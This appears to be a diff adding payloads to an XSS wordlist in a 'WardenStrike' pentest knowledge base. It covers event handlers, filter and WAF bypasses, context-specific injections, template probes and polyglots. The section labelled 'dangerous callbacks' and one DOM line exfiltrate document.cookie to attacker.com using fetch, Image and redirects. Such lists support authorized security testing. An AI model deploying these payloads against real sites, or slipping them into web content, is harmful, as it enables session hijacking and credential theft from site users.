@@ -1,5 +1,6 @@
 # XSS Payloads - WardenStrike Knowledge Base
-# Basic
+
+# ─── Basic ────────────────────────────────────────────────────────────────────
 <script>alert(1)</script>
 <img src=x onerror=alert(1)>
 <svg onload=alert(1)>
@@ -10,8 +11,12 @@
 javascript:alert(1)
 <details open ontoggle=alert(1)>
 <marquee onstart=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<button onfocus=alert(1) autofocus>
 
-# Event handlers
+# ─── Event Handlers ───────────────────────────────────────────────────────────
 <img src=x onerror=alert(1)>
 <input onfocus=alert(1) autofocus>
 <video src=x onerror=alert(1)>
@@ -19,9 +24,14 @@ javascript:alert(1)
 <iframe onload=alert(1)>
 <object data=javascript:alert(1)>
 <embed src=javascript:alert(1)>
+<body onpageshow=alert(1)>
+<body onhashchange=alert(1)><a href=#>click</a>
+<body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+<form><button formaction=javascript:alert(1)>click
+<isindex action=javascript:alert(1) type=image>
 <math><mtext><table><mglyph><svg xmlns=http://www.w3.org/2000/svg><handler xmlns:ev=http://www.w3.org/2001/xml-events ev:event=load>alert(1)</handler></svg></mglyph></table></mtext></math>
 
-# Filter bypass
+# ─── Filter Bypass ────────────────────────────────────────────────────────────
 <scr<script>ipt>alert(1)</scr</script>ipt>
 <ScRiPt>alert(1)</sCrIpT>
 <script>alert(String.fromCharCode(88,83,83))</script>
@@ -30,8 +40,46 @@ javascript:alert(1)
 <img src=x onerror=\u0061lert(1)>
 <svg/onload=alert(1)>
 <SVG ONLOAD=&#97;&#108;&#101;&#114;&#116;(1)>
+<script>alert(/XSS/)</script>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<script>setTimeout('alert(1)',0)</script>
+<script>Function('alert(1)')()</script>
+<script>window['al'+'ert'](1)</script>
+<script>top['al'+'ert'](1)</script>
+<img src=`x`onerror=alert(1)>
+<img """><script>alert(1)</script>">
+<<SCRIPT>alert(1)//<</SCRIPT>
+<script>alert(1)<!–
+<SCRIPT/SRC="data:,alert(1)"></SCRIPT>
 
-# DOM-based
+# ─── Attribute Context ────────────────────────────────────────────────────────
+" onmouseover="alert(1)
+' onmouseover='alert(1)
+" onfocus="alert(1)" autofocus="
+" onclick="alert(1)" x="
+`onmouseover=alert(1)`
+" style="animation-name:rotation" onanimationstart="alert(1)
+
+# ─── href/src Context ────────────────────────────────────────────────────────
+javascript:alert(1)
+javascript:alert`1`
+JaVaScRiPt:alert(1)
+&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;
+java&#00;script:alert(1)
+java&#09;script:alert(1)
+java&#10;script:alert(1)
+java&#13;script:alert(1)
+vbscript:msgbox(1)
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+
+# ─── CSS/Style Context ────────────────────────────────────────────────────────
+<div style="width:expression(alert(1))">
+<style>@import 'javascript:alert(1)'</style>
+<style>body{-moz-binding:url("http://xss.rocks/xsstest.xml#xss")}</style>
+<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
+
+# ─── DOM-Based ────────────────────────────────────────────────────────────────
 ';alert(1)//
 \';alert(1)//
 </script><script>alert(1)</script>
@@ -39,6 +87,50 @@ javascript:alert(1)
 '-alert(1)-'
 ${alert(1)}
 {{constructor.constructor('alert(1)')()}}
+\u003cscript\u003ealert(1)\u003c/script\u003e
+<img src=x onerror=this.src='http://attacker.com/?c='+document.cookie>
 
-# Polyglot
+# ─── Template Injection / Framework ──────────────────────────────────────────
+{{7*7}}
+{{constructor.constructor('alert(1)')()}}
+${7*7}
+<%= 7*7 %>
+#{7*7}
+*{7*7}
+@{7*7}
+
+# ─── WAF Bypass ───────────────────────────────────────────────────────────────
+<svg+onload=alert(1)>
+<svg%09onload=alert(1)>
+<svg%0Aonload=alert(1)>
+<svg%0Donload=alert(1)>
+<svg%0Conload=alert(1)>
+<svg onload="al\u0065rt(1)">
+<svg onload=al&#101;rt(1)>
+<img src=x onerror=alert&lpar;1&rpar;>
+<script>document.write('<img src=x onerror=alert(1)>')</script>
+<svg><script>alert&#40;1&#41;</script>
+<script type="text/javascript">alert(1)</script>
+<script language="javascript">alert(1)</script>
+<a href=j%61v%61script:alert(1)>click me</a>
+<a href="&#0000106avascript:alert(1)">click me</a>
+<img src="x" onerror="a=alert,a(1)">
+
+# ─── Stored XSS Payloads (dangerous callbacks) ────────────────────────────────
+<img src=x onerror=document.location='http://attacker.com/?c='+document.cookie>
+"><script>new Image().src='http://attacker.com/?c='+encodeURIComponent(document.cookie)</script>
+<script>fetch('http://attacker.com/?c='+btoa(document.cookie))</script>
+<svg onload="fetch('http://attacker.com/?c='+document.cookie)">
+
+# ─── XSS in JSON ─────────────────────────────────────────────────────────────
+{"name":"<script>alert(1)</script>"}
+{"name":"\u003cscript\u003ealert(1)\u003c/script\u003e"}
+
+# ─── XSS via HTTP Headers ─────────────────────────────────────────────────────
+# User-Agent: <script>alert(1)</script>
+# Referer: <script>alert(1)</script>
+# X-Forwarded-For: <script>alert(1)</script>
+
+# ─── Polyglot ─────────────────────────────────────────────────────────────────
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+'">><marquee><img src=x onerror=confirm(1)></marquee></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&)>'">
